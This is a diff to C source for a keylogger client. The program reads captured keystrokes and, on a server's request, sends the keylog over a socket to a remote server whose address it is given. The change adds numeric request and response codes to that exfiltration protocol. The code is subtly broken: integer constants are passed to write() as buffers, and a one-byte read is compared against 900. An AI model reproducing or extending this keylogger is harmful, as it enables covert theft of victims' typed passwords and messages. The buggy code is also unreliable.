@@ -10,6 +10,14 @@
 
 #define BUF_SIZE 256
 
+//server -> client(target)
+#define GET_LOG_REQUEST 100
+#define EXIT_PROC_REQUEST 900
+
+//client(target) -> server
+#define SEND_LOG_RESPONSE 101
+#define SEND_ERR_RESPONSE 102
+#define EXIT_PROC_RESPONSE 901
 
 
 void sendLog(char* str, int sendSize, char* servIP, char* port);
@@ -56,6 +64,9 @@ int main(int argc, char* argv[])
 	// get message's size
 	sendSize = strlen(str)+1;
 
+	// if fileSize = 0  then SEND_ERR_RESPONSE to server
+	if(fileSize == 0)
+		sendSize = 0;
 
 	// test : print keylog message, size
 	puts(str);
@@ -108,18 +119,24 @@ void sendLog(char* str, int sendSize, char* servIP, char* port){
 		read(sock, &option, 1);
 
 		switch (option){
-			case '1' :
+			case GET_LOG_REQUEST :
 				printf("case1\n");
-				write(sock, str, strlen(str));
-				// ToDo : write socket
+				if(sendSize == 0)	// send to client 'SEND_ERR_RESPONSE'
+					write(sock, SEND_ERR_RESPONSE, 1);
+				else{
+					// send to client 'SEND_LOG_RESPONSE'	
+					write(sock, SEND_LOG_RESPONSE, 1);
+					write(sock, str, strlen(str));
+				}
 				break;
-
+/*
 			case '2' :
 				printf("case2\n");
 				// something else~~
 				break;
+*/
 
-			case 'q' :
+			case EXIT_PROC_REQUEST :
 				printf("exit keylogging\n"); 
 				break;
 
